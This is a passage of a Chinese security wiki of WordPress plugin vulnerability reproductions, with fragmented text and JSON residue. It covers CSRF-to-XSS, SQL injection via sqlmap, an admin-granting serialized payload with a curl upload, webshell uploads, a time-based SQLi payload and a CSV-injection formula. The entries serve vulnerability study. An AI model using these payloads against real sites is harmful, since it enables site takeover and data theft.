要覆盖的目标有了，但是导入的数据信息到底怎么构造呢？ 回头看下ninja_forms_ajax_import_form函数 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId35.png) ninja_forms_ajax_import_form函数从POST请求中获取import参数，这个值就是导入模板的信息。接着程序将其传入import_form方法中进行导入处理。 $_POST['import']值应该是什么样子的呢？只有知道了这个值的格式，我们才好构造payload 经过一番搜索，位于wp-content\\plugins\\ninja-forms\\ninja-forms.php文件中WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId36.png) 我们可以看到如上的代码 可见程序通过template方法读取位于wp-content\\plugins\\ninja-forms\\includes\\Templates文件夹的formtemplate-contactform.nff文件内容，并传入import_form接口 formtemplate-contactform.nff文件是这个样子的 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId37.png) 到这里就很好办了，.nff文件正是ninja forms插件导出表单的默认格式。 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId38.png) 因此利用思路比较清晰了 攻击者在本地模仿目标表单模板构造一个含有恶意代码的表单模板 通过ninja forms插件将其导出为.nff文件 构造csrf页面，该页面会在管理员访问时发起csrf攻击，使用恶意的表单模板替换原有模板 诱使管理员访问 当用户与管理员使用这个恶意表单的页面时，xss将会被触发 现在已经理清利用思路，接下来构造一个恶意的.nff文件。模仿上文的normal_form表单，攻击者可以构造一个与之相似的恶意表单，与之不同的是，攻击者在描述处加入一行js脚本 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId39.png) 攻击者将这个恶意的表单模板导出 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId40.png) 导出的恶意表单部分内容如下 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId41.png) 攻击者构造一个表单提交页面，表单提交的地址为http://www.0-sec.org/wordpress/wp-admin/admin-ajax.php?action=ninja\\_forms\\_ajax\\_import\\_form提交内容中import值为恶意文件内容、formID值为要覆盖的原normal\\_form的id，并诱使管理员点击页面链接 当攻击成功后，normal_form表单将会被恶意的表单覆盖 当用户使用该表单进行提交时 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId42.png) 点击submit时xss被触发 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId43.png)不仅如此，当管理员在后台管理编辑该表单时，当进入编辑页面，xss仍然可以被触发 WordPressPlugin-NinjaFormsCSRFtoXSS/media/rId44.png) 参考链接 https://xz.aliyun.com/t/7768\\#toc-0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:24 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - AutoSuggest sql注入/WordPress Plugin - AutoSuggest sql注入 .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - AutoSuggest sql注入/WordPress Plugin - AutoSuggest sql注入 .html","title":"WordPress Plugin - AutoSuggest sql注入 ","keywords":"","body":"WordPress Plugin - AutoSuggest sql注入 一、漏洞简介 WP AutoSuggest这款插件在访问者输入关键字时，插件会在提交搜索查询之前通过AJAX请求在网页中显示一些建议。访问者可以通过按Enter继续搜索，或者访问者可以使用键盘箭头直接访问建议的帖子。 二、漏洞影响 三、复现过程 首先我们得进入exploit-db网站上下载这个存在漏洞的版本的插件原始码和本地构建WordPress网站（本地构建WordPress这里就不说了）。下载源码，如下图所示 下载完成之后，把wp-autosuggest目录直接拖到Wordpress目录的\\wp-content\\plugins\\下。 接着，登录后台，启用这款插件，如下图所示： 启用后，退出后台，如下图所示： 然后根据exploit-db网站上给出的漏洞详情，我们访问下面的URL： http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1 访问后，网页内容如下图所示： 根据exploit-db网站上给出的漏洞详情，我们也知道了wpas_keys参数存在注入，于是我们可以使用SQLMAP注入神器，对网站进行注入。SQLMAP命令如下： sqlmap.py -u \"http://www.0-sec.org/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1*\" --technique BT --dbms MYSQL --risk 3 --level 5 --tamper space2comment 一开始，笔者使用的时php5.2.17+Apache的环境，结果复现不了，头疼了半天，如下图： 后来笔者换了一个php-5.4.45+Apache的环境，就解决了。 通过SQLMAP，成功获取到服务器的一些信息，如下图所示： 下图也成功跑出了当前数据库的名称。 漏洞分析 分析WordPress插件的话还是挺容易的。文件和代码也不是很多，用Notepad++就够用啦。进入插件根目录下面就看到了autosuggest_functions.php、autosuggest.php这两个php文件。 下面是autosuggest.php文件所有代码： '; global $wpdb; $wpas_keys = str_replace(' ','%',$wpas_keys); $pageposts = $wpdb->get_results(\"SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC\"); foreach ($pageposts as $post) { setup_postdata($post); echo \"\"; the_title(); echo \"\"; } echo ''; die(); } define('AUTOSUGGEST_DIR', get_option('siteurl') . '/' . PLUGINDIR.'/'.dirname(plugin_basename(__FILE__))); function add_autosuggest_css() { wp_register_style('autosuggestCSS', AUTOSUGGEST_DIR . '/css/wp_autosuggest.css', null, '1', 'screen'); wp_enqueue_style('autosuggestCSS'); } function add_autosuggest_js() { wp_register_script('autosuggestJS', AUTOSUGGEST_DIR . '/js/wp.autosuggest.js', null, '1'); wp_enqueue_script('autosuggestJS'); } function add_autosuggest_footer_code() { ?> var autosuggest_options = { script: \"/autosuggest.php?wpas_action=query&\", varname: \"wpas_keys\", shownoresults:true, noresults:\"\", timeout:15000, callback:autosuggestSelected, maxresults: }; var as = new AutoSuggest('', autosuggest_options); function autosuggestSelected(entry) { document.location = entry['id']; } WP AutoSuggest settings updated. WP AutoSuggest Settings Search Input ID \" id=\"wpas_input_id\" name=\"wpas_input_id\"/> Default value is 's' which is used with the default WordPress theme. Max Results \" id=\"wpas_maxresults\" name=\"wpas_maxresults\"/> Maximum number of suggested results (10 by default). 相信大家没看几行就看出了问题的所在，变量wpas_keys是直接获取GET中的wpas_keys。一点都没过滤，并且在下面代码中，变量wpas_keys也带入数据库中查询了（wpdb是wordpress操作数据库方法），于是SQL注入就产生了。 四、参考链接 https://www.exploit-db.com/exploits/45977 https://www.freebuf.com/vuls/191869.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:38 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Baidu xss漏洞/WordPress Plugin - Baidu xss漏洞 .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Baidu xss漏洞/WordPress Plugin - Baidu xss漏洞 .html","title":"WordPress Plugin - Baidu xss漏洞 ","keywords":"","body":"WordPress Plugin - Baidu xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 Page Builder bySiteOrigin插件内置一款实时编辑器，用户可以在观察实时更改的同时更新内容，这使得页面的编辑和设计或发布过程更加流畅。 本次漏洞就是出现在该插件内置的实时编辑器中。 在编辑文章活页面时点击实时编辑器按钮即可使用此工具 在实时编辑器中可以实时预览编辑文章、添加小工具、修改页面布局等情况 以添加小工具功能为例，我们可以添加一个自定义HTML模块 在这个模块中添加一些内容 完成编辑后，用户的编辑效果可以实时呈现在编辑器浏览页面中 实时编辑器仅提供用户对草稿的编辑与预览。如果需要保存与发布，还需要点击Save Draft按钮 在了解了Page Builder by SiteOrigin插件的功能之后，再看一下后台是如何实现与如何产生漏洞的 当用户点击实时编辑器按钮后，会进入上文描述的实时编辑器页面 此时用户可以对页面进行一些编辑操作，当用户编辑完成后点击已完成按钮后，会向后台发送如下请求： url中p参数代表目前编辑的文章id，siteorigin_panels_live_editor=true代表目前正开启使用实时编辑器，live_editor_panels_data参数值为修改后的页面数据 可以跟进插件后台看一下代码 程序通过is_live_editor来判断是否使用实时编辑器 我们接下来看一下is_live_editor函数 is_live_editor函数的作用是检查用户是否在前端的实时编辑器中，当用户提交的请求url中siteorigin_panels_live_editor不为空时，则判断用户正在使用实时编辑器 接着，程序调用SiteOrigin_Panels_Live_Editor::single()函数包含实时编辑器文件 在SiteOrigin_Panels_Live_Editor类的构造方法中，通过add_action函数将post_metadata函数挂载到get_post_metadata hook上 get_{$meta_type}_metadata hook用以处理动态部分$meta_type指定的元数据类型并获取元数据，这里是用来获取挂载的post_metadata函数返回的元数据 接下来看一下post_metadata函数 在post_metadata函数中，对访问实时编辑器的用户身份、提交的跟新信息等进行校验，通过校验的数据可以进行后续处理并返回元数据。但post_metadata函数并没有通过校验csrf token来保护提交数据的来源合法性。这将导致csrf漏洞的产生。 在通过一系列的校验后，程序将live_editor_panels_data参数提交的页面信息进行加工并进行渲染工作。程序使用add_filter('the_content', string $content )实现页面内容加工工作,然后再将其打印到屏幕上 这里用来加工页面信息的函数是generate_post_content 最终，live_editor_panels_data参数中提交的新的页面信息将会被打印到屏幕上 需要特别注意的是，此插件实施编辑器中有如下代码 实时编辑器通过header( 'X-XSS-Protection: 0');设置X-XSS-Protection响应头以关闭浏览器XSS保护。可见这个插件的实时编辑器页面中允许xss的触发 漏洞复现 构造实时编辑提交页面修改的数据包 将其中的content字段改为xss payload 生成csrf poc 当管理员访问该poc页面时，xss触发 通过xss漏洞，可以构造payload进行进一步的攻击，例如添加一个管理员账号。 参考链接 https://kumamon.fun/WordPress-Page-Buider/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:41 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Easy WP SMTP 反序列化漏洞/WordPress Plugin - Easy WP SMTP 反序列化漏洞 .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Easy WP SMTP 反序列化漏洞/WordPress Plugin - Easy WP SMTP 反序列化漏洞 .html","title":"WordPress Plugin - Easy WP SMTP 反序列化漏洞 ","keywords":"","body":"WordPress Plugin - Easy WP SMTP 反序列化漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 我们首先搭建一个wordpress站点，安装v1.3.9版本的Easy WP SMTP，并进行相关配置。 在以下概念验证中，我将用于swpsmtp_import_settings上传一个文件，该文件包含恶意的序列化有效负载，该负载将使用户能够注册（users_can_register）并将用户默认角色（default_role）设置为数据库中的\"管理员\"。 1.创建一个文件名\" /tmp/upload.txt\"，并添加以下内容： a:2:{s:4:\"data\";s:81:\"a:2:{s:18:\"users_can_register\";s:1:\"1\";s:12:\"default_role\";s:13:\"administrator\";}\";s:8:\"checksum\";s:32:\"3ce5fb6d7b1dbd6252f4b5b3526650c8\";} 2.上传文件 $ curl https://0-sec.org/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:46 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - File Manager 任意文件上传漏洞/WordPress Plugin - File Manager 任意文件上传漏洞.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - File Manager 任意文件上传漏洞/WordPress Plugin - File Manager 任意文件上传漏洞.html","title":"WordPress Plugin - File Manager 任意文件上传漏洞","keywords":"","body":"WordPress Plugin - File Manager 任意文件上传漏洞 一、漏洞简介 File Manager是一个WordPress插件，由于函数处理不严谨，可构造恶意请求包上传任意文件。漏洞主要因为File Manager插件中的elFinder库的调用未进行严格访问控制触发，导致可以被直接利用 二、漏洞影响 免费版受影响版本：V6.0-V6.8 Pro版受影响版本：V7.6-V7.0 三、复现过程 漏洞分析 漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\php\\connector.minimal.php 首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run(); 如果HTTP请求的方法是POST，会把POST和GET请求的数据保存到$src，然后判断POST传的参数。如果不传入targets，就不会进入前几个判断，之后会把POST请求传的cmd变量赋给$cmd，然后调用commandExists()检测传入的$cmd是否存在。 然后利用commandArgsList()函数获取$cmd对应的命令参数列表，漏洞利用需要上传文件，这里只关注$cmd为upload的情况。 public function commandArgsList($cmd) { if ($this->commandExists($cmd)) { $list = $this->commands[$cmd]; $list['reqid'] = false; } else { $list = array(); } return $list; } /*upload对应的数组如下: 'upload' => array( 'target' => true, 'FILES' => true, 'mimes' => false, 'html' => false, 'upload' => false, 'name' => false, 'upload_path' => false, 'chunk' => false, 'cid' => false, 'node' => false, 'renames' => false, 'hashes' => false, 'suffix' => false, 'mtime' => false, 'overwrite' => false, 'contentSaveId' => false) */ 循环遍历，将POST传入的参数保存到$args数组中，然后调用input_filter()函数对$args进行简单的过滤， 替换掉%00，并且做stripslashes()处理。然后将通过表单上传的文件$_FILES存到$args['FILE']中。然后调用exec()函数，跟进 前面会进行一些判断，最后进入到$this->$cmd($args)调用upload()函数，跟进 首先将POST传入的target赋给$target变量，然后调用volume()函数， 可以看到$this->volume数组含有两项，一项是l1_，一项是t1_，volume()函数定义如果传入的$hash以l1_或t1_开头，返回$this->volume数组对应的值，否则返回false。在upload函数中会检测$volume，如果其为false，程序会报错结束，所以POST传入的target必须以它们两个为前缀。继续分析upload()函数。依次取出$args数组中的值赋给相应的变量，这里要求$args['FILES']['upload']也就是$_FILES['upload']为数组，才能将其赋给$files变量，这就需要上传文件时上传一个文件数组。接下来其他的如html、upload_path、chunk、cid、mtime等参数可以不传。之后遍历$files['name']也就是$_FILES['upload']['name']，如果文件上传成功，将$_FILES['upload']['name']赋给$tmpname，然后调用fopen()打开上传的临时文件，将指针保存在$fp。在不传入upload_path时$thash等于$target，所以$_target为$target为我们POST传入的target变量。之后调用了$volume->upload()函数，第一个参数为之前打开文件的指针，第二个参数为POST传入的target变量，第三个参数为上传的文件名，第四个参数为空的数组。跟进elFinderVolumeDriver的upload() public function upload($fp, $dst, $name, $tmpname, $hashes = array()) { if ($this->commandDisabled('upload')) { return $this->setError(elFinder::ERROR_PERM_DENIED); } if (($dir = $this->dir($dst)) == false) { return $this->setError(elFinder::ERROR_TRGDIR_NOT_FOUND, '#' . $dst); } if (empty($dir['write'])) { return $this->setError(elFinder::ERROR_PERM_DENIED); } if (!$this->nameAccepted($name, false)) { return $this->setError(elFinder::ERROR_INVALID_NAME); } $mimeByName = ''; if ($this->mimeDetect === 'internal') { $mime = $this->mimetype($tmpname, $name); } else { $mime = $this->mimetype($tmpname, $name); $mimeByName = $this->mimetype($name, true); if ($mime === 'unknown') { $mime = $mimeByName; } } if (!$this->allowPutMime($mime) || ($mimeByName && !$this->allowPutMime($mimeByName))) { return $this->setError(elFinder::ERROR_UPLOAD_FILE_MIME, '(' . $mime . ')'); } $tmpsize = (int)sprintf('%u', filesize($tmpname)); if ($this->uploadMaxSize > 0 && $tmpsize > $this->uploadMaxSize) { return $this->setError(elFinder::ERROR_UPLOAD_FILE_SIZE); } $dstpath = $this->decode($dst); if (isset($hashes[$name])) { $test = $this->decode($hashes[$name]); $file = $this->stat($test); } else { $test = $this->joinPathCE($dstpath, $name); $file = $this->isNameExists($test); } $this->clearcache(); if ($file && $file['name'] === $name) { // file exists and check filename for item ID based filesystem if ($this->uploadOverwrite) { if (!$file['write']) { return $this->setError(elFinder::ERROR_PERM_DENIED); } elseif ($file['mime'] == 'directory') { return $this->setError(elFinder::ERROR_NOT_REPLACE, $name); } $this->remove($test); } else { $name = $this->uniqueName($dstpath, $name, '-', false); } } $stat = array( 'mime' => $mime, 'width' => 0, 'height' => 0, 'size' => $tmpsize); // $w = $h = 0; if (strpos($mime, 'image') === 0 && ($s = getimagesize($tmpname))) { $stat['width'] = $s[0]; $stat['height'] = $s[1]; } // $this->clearcache(); if (($path = $this->saveCE($fp, $dstpath, $name, $stat)) == false) { return false; } $stat = $this->stat($path); // Try get URL if (empty($stat['url']) && ($url = $this->getContentUrl($stat['hash']))) { $stat['url'] = $url; } return $stat; } 首先进入commandDisabled()函数，返回false。 然后进入dir()函数，参数为$dst即POST传入的target值。 调用了file函数， 跟进decode()函数 decode()函数首先判断是否以$this->id开头，然后截取出l1_后面的内容，之后进行base64解密，uncrypt函数如上，未作操作。然后更换分隔符，之后调用abspathCE()函数，从注释中可以看出，abspathCE()函数会先判断$path是否等于分隔符\\,如果等于，返回$this->root，否则返回$this->root拼接$path。看下对应的abspathCE()函数。 ps：POST传入target前缀不同的区别 前缀为l1_时，$this->root 为C:\\Users\\admin\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files {width=\"5.833333333333333in\" height=\"2.864215879265092in\"} 前缀为t1_时，$this->disabled[]包含upload，程序会报错结束，$this->root 为C:\\Users\\admin\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\.trash {width=\"5.833333333333333in\" height=\"4.630450568678915in\"} 继续分析程序流程，decode()函数会返回C:\\Users\\admin\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files,然后调用stat()函数。 stat()函数返回的$ret为 Array ( [isowner] => [ts] => 1589423646 [mime] => directory [read] => 1 [write] => 1 [size] => 0 [hash] => l1_Lw [name] => files [rootRev] => [options] => Array ( [path] => [url] => /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/ [tmbUrl] => /wordpress/wp-content/plugins/wp-file-manager/lib/php/../files/.tmb/ [disabled] => Array ( [0] => chmod ) [separator] => [copyOverwrite] => 1 [uploadOverwrite] => 1 [uploadMaxSize] => 9223372036854775807 [uploadMaxConn] => 3 [uploadMime] => Array ( [firstOrder] => deny [allow] => Array ( [0] => all ) [deny] => Array ( [0] => all ) ) [dispInlineRegex] => ^(?:(?:video|audio)|image/(?!.+\\+xml)|application/(?:ogg|x-mpegURL|dash\\+xml)|(?:text/plain|application/pdf)$) [jpgQuality] => 100 [archivers] => Array ( [create] => Array ( [0] => application/x-tar [1] => application/zip ) [extract] => Array ( [0] => application/x-tar [1] => application/zip ) [createext] => Array ( [application/x-tar] => tar [application/zip] => zip ) ) [uiCmdMap] => Array ( ) [syncChkAsTs] => 1 [syncMinMs] => 10000 [i18nFolderName] => 0 [tmbCrop] => 1 [tmbReqCustomData] => [substituteImg] => 1 [onetimeUrl] => 1 [trashHash] => t1_Lw [csscls] => elfinder-navbar-root-local ) [volumeid] => l1_ [locked] => 1 [isroot] => 1 [phash] => ) 返回dir()函数，然后在返回到upload()函数，将返回值赋给upload()函数中的$dir变量， 然后进行mime的判断，程序识别上传的php脚本的mime为text/x-php，跟进allowPutMime()函数， 从程序自带的注释中可以看出如果uploadOrder数组为array('deny','allow')，则默认允许上传$mime类型的文件。然后获取文件的大小，若文件大小不合法报错结束程序，之后decode()处理$dst(POST传入的target值)返回结果赋给$dstpath，因为$hash为空数组，所以会调用joinPathCE()将$dstpath和$name(上传文件的文件名)拼接，然后检查文件是否存在。 最后调用$this->saveCE() 跟进_save()。 本地是利用Windows系统分析，$path为C:\\Users\\admin\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\shell.php;$uri为C:\\Windows\\phpxxxx.tmp，最后会调用copy()将上传的文件复制到\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\shell.php，即完成了任意文件上传。 漏洞复现 访问https://www.0-sec.org/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:48 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Google Review Slider 6.1 SQL Injection/WordPress Plugin - Google Review Slider 6.1 SQL Injection .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Google Review Slider 6.1 SQL Injection/WordPress Plugin - Google Review Slider 6.1 SQL Injection .html","title":"WordPress Plugin - Google Review Slider 6.1 SQL Injection ","keywords":"","body":"WordPress Plugin - Google Review Slider 6.1 SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 inurl:\\\"/wp-content/plugins/wp-google-places-review-slider/\\\" POC : GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=*** &taction=edit HTTP/1.1 sqlmap result sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests: --- Parameter: tid (GET) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM (SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edi Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:55 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - NextGEN Gallery = 3.2.2 RCE/WordPress Plugin - NextGEN Gallery = 3.2.2 RCE .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - NextGEN Gallery = 3.2.2 RCE/WordPress Plugin - NextGEN Gallery = 3.2.2 RCE .html","title":"WordPress Plugin - NextGEN Gallery = 3.2.2 RCE ","keywords":"","body":"WordPress Plugin - NextGEN Gallery \\ 一、漏洞简介 WordPress插件NextGEN Gallery \\ 当zip压缩文件包含大量图片时将导致处理进程崩溃，而临时目录没有删除。如果在zip压缩包中放置一个php文件，那么该php文件会被解压到临时目录造成RCE漏洞。 官方在2019年6月4日发布了3.2.4版本修复了漏洞。 二、漏洞影响 三、复现过程 第1步：制作Zip压缩包 我制作了一个包含800张图片和1个恶意php文件（abc233.php）的zip压缩包，图片都是几KB的小图片，恶意php文件的功能是往上级目录写入webshell，abc233.php文件内容如下： '); ?> 第2步：上传zip压缩包 点击\"Add Gallery / Images\"然后上传zip压缩包。 第3步：查看临时目录 点击\"import folder\"，再点击\"uploads\"即可看到解压的临时目录。 第4步：生成webshell 访问临时目录下的abc233.php文件即可在/wp-content/uploads目录下生成webshell。 http://0-sec.org/wp-content/uploads/unpacked-phpA0CB.tmp/abc233.php image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:57 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Quizlord 2.0 XSS/WordPress Plugin - Quizlord 2.0 XSS .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Quizlord 2.0 XSS/WordPress Plugin - Quizlord 2.0 XSS .html","title":"WordPress Plugin - Quizlord 2.0 XSS ","keywords":"","body":"WordPress Plugin - Quizlord 2.0 XSS 一、漏洞简介 二、漏洞影响 三、复现过程 首先搭建worepress，我的版本是4.4。然后进入后台下载插件Quizlord，版本是2.0。 下载、安装完成后，需要点击启用插件。 根据exploit-db给出的漏洞详情，找到触发漏洞的位置。 进入后台选择Quizlord插件 此时浏览器的地址栏正好对应poc中的referer内容，现在只要使用火狐插件hackbar并根据POC构造POST请求 点击execute即可发送该POST请求。 请求成功后，返回是一个空白页。 返回上一页并刷新即可触发该漏洞。 通过复现这个漏洞，我们可以知道它属于后台存储型XSS，且它的危害其实并不是很大。 需要进入后台，因此必须得知道后台用户的账号和密码。 下面我们来简单分析一下漏洞的成因。 漏洞成因分析 WordPress插件源码位置： \\wp4_4\\wp-content\\plugins 进入Quizlord插件目录，找到quizlord.php文件。 下图是quizlord.php文件的内容 根据POC快速定位到函数。发现POST传入的数据并没有被程序过滤就写入了数据库中。 四、参考链接 https://www.freebuf.com/vuls/189814.html https://www.exploit-db.com/exploits/45307/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:00 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Real-Time Find and Replace xss漏洞/WordPress Plugin - Real-Time Find and Replace xss漏洞.html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Real-Time Find and Replace xss漏洞/WordPress Plugin - Real-Time Find and Replace xss漏洞.html","title":"WordPress Plugin - Real-Time Find and Replace xss漏洞","keywords":"","body":"WordPress Plugin - Real-Time Find and Replace xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 这一部分是对本次漏洞分析过程中涉及到的WordPress一些函数与机制的介绍，如果对WordPress很了解可以直接跳过 Real-Time Find and Replace插件是如何注册的 首先分析下Real-Time Find and Replace插件是如何注册到wordpress的菜单栏中的，以及WordPress是如何调用该插件 real-time-find-and-replace插件代码很少，只有一个php文件real-time-find-and-replace.php 首先看wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php 17行处的far_add_pages方法，该方法中使用add_submenu_page方法对wordpress的顶级菜单添加子菜单 add_submenu_page方法的参数说明如下 parent_slug- 父菜单的子名称（或标准WordPress管理页面的文件名）page_title- 选择菜单后在页面标题标签中显示的文本menu_title- 菜单中使用的文本capability- 向用户显示此菜单所需的功能menu_slug- 别名，用于引用此菜单function- 用于输出此页面内容的函数 这里重点看下parent_slug参数和function参数 parent_slug参数值为tools.php 因此这里是在工具菜单栏处添加此子菜单 从后台页面显示结果来看，的确如此 除此之外，通过parent_slug参数，可以在如下不同位置添加子菜单 1、在仪表盘菜单处: add_submenu_page( ‘index.php’, … ); 2、在文章菜单处: add_submenu_page( ‘edit.php’, … ); 3、在媒体菜单处: add_submenu_page( ‘upload.php’, … ); 4、在链接菜单处: add_submenu_page( ‘link-manager.php’, … ); 5、在页面菜单处: add_submenu_page( ‘edit.php?post_type=page’, … ); 6、在评论菜单处: add_submenu_page( ‘edit-comments.php’, … ); 7、在自定义文章类型菜单处: add_submenu_page(‘edit.php?post_type=your_post_type’,…) 8、在外观菜单处: add_submenu_page( ‘themes.php’, … ); 9、在插件菜单处: add_submenu_page( ‘plugins.php’, … ); 10、在用户菜单处: add_submenu_page( ‘users.php’, … ); 11、在工具菜单处: add_submenu_page( ‘tools.php’, … ); 12、在设置菜单处: add_submenu_page( ‘options-general.php’, … ); 接着来看add_submenu_page方法的function参数： function参数指定用于输出此页面内容的函数。这里指定的是far_options_page，也就是要用far_options_page来输出页面信息 关于add_submenu_page方法需要了解的就这么多，继续往下看 可见19行有一处add_action( \"admin_print_scripts-$page\", 'far_admin_scripts');代码接下来介绍下add_action的首参，admin_print_scripts-$page是什么$page是add_submenu_page方法的返回值，add_submenu_page方法在添加子菜单成功后，会将子菜单的对应页面的page_hook作为返回值返回 这里的$page值为tools_page_real-time-find-and-replace。使用add_submenu_page方法注册的子菜单page_hook都是唯一的，程序也是通过这个值来区分我们注册的不同页面 如果想理解admin_print_scripts-(page_hook)，不妨先看看和它很相似的admin_print_script方法： admin_print_scripts方法用来给WordPress后台页面引入js与css文件。使用这个钩子会在所有WordPress后台页面中引入js与css文件。 实际操作中往往不需要在WordPress后台所有页面中加载同一组js与css文件，而是在指定页面中引入指定的js或css文件，这里就需要使用admin_print_scripts-(page_hook)方法。 admin_print_scripts-(page_hook)方法中的page_hook部分指定了需要加载js或css文件的页面。在这个插件代码中，通过add_action(\"admin_print_scripts-$page\", 'far_admin_scripts');在admin_print_scripts-tools_page_real-time-find-and-replace页面中加载far_admin_scripts函数，而far_admin_scripts函数中指定了要引入的js与css文件，见下图 引入的这些js与css文件，将在add_submenu_page方法function参数渲染生成页面时生效。 在弄清楚插件是如何注册后，通过访问工具菜单栏中的real-time-find-and-replace子菜单，即可进入存在漏洞的页面，该页面即为far_options_page函数加载far_admin_scripts函数中引入的js与css文件后所渲染的结果 Real-Time Find and Replace插件是如何工作的 这一部分比较有意思。在看代码之前，通过Real-Time Find and Replace插件的介绍来看，这个插件可以实时查找和替换网站页面中的数据。但这一点是如何做到的呢？我一度以为这个插件可以遍历读取所有的页面文件，对文件内容直接进行搜索与替换，但这样实现未免太繁琐了。 跟踪代码可以发现，实际的实现很巧妙。wp-content\\plugins\\real-time-find-and-replace\\real-time-find-and-replace.php中可看到下列代码 在real-time-find-and-replace.php文件代码的最后一行，通过add_action将far_template_redirect函数连接到template_redirect钩子上。template_redirect钩子将会在显示所请求页面的模板文件前执行，以便插件改写对模板文件的选择。 接着看下far_template_redirect函数 far_template_redirect中使用ob_start函数打开输出缓冲区，将所请求页面的模板文件信息保存在输出缓冲区中,并使用far_ob_call函数处理输出结果。 far_ob_call函数对所请求页面的模板文件内容进行搜索与替换 因此最终输出的页面中内容被修改，但是页面文件自身并不会被修改 漏洞复现 本次漏洞就出在了real-time-find-and-replace插件管理页面，该页面提供了wordpress页面全局搜索与替换的功能 执行完毕之后，wordpress中所有 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:04 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Search Meter 2.13.2 CSV Injection/WordPress Plugin - Search Meter 2.13.2 CSV Injection .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Search Meter 2.13.2 CSV Injection/WordPress Plugin - Search Meter 2.13.2 CSV Injection .html","title":"WordPress Plugin - Search Meter 2.13.2 CSV Injection ","keywords":"","body":"WordPress Plugin - Search Meter 2.13.2 CSV Injection 一、漏洞简介 二、漏洞影响 三、复现过程 首先在搜索框里输入paylaod =cmd|' /C notepad'!'A1' 然后访问 http://www.0-sec.org/wordpress/wp-admin/index.php?page=search-meter%2Fadmin.php 并且到处csv文件 之后，我们在Excel中打开文件，并使用逗号作为分隔符从外部文件导入数据 这时候payload就会被执行了 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:07 "},"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Social Warfare=3.5.2 RCE/WordPress Plugin - Social Warfare=3.5.2 RCE .html":{"url":"Web安全/Wordpress/Wordpress 插件漏洞/WordPress Plugin - Social Warfare=3.5.2 RCE/WordPress Plugin - Social Warfare=3.5.2 RCE .html","title":"WordPress Plugin - Social Warfare=3.5.2 RCE ","keywords":"","body":"WordPress Plugin - Social Warfare\\ 一、漏洞简介 2019年3月21日插件作者紧急发布了3.5.3版本以修复高危的RCE漏洞，在\\ 二、漏洞影响 三、复现过程 漏洞分析 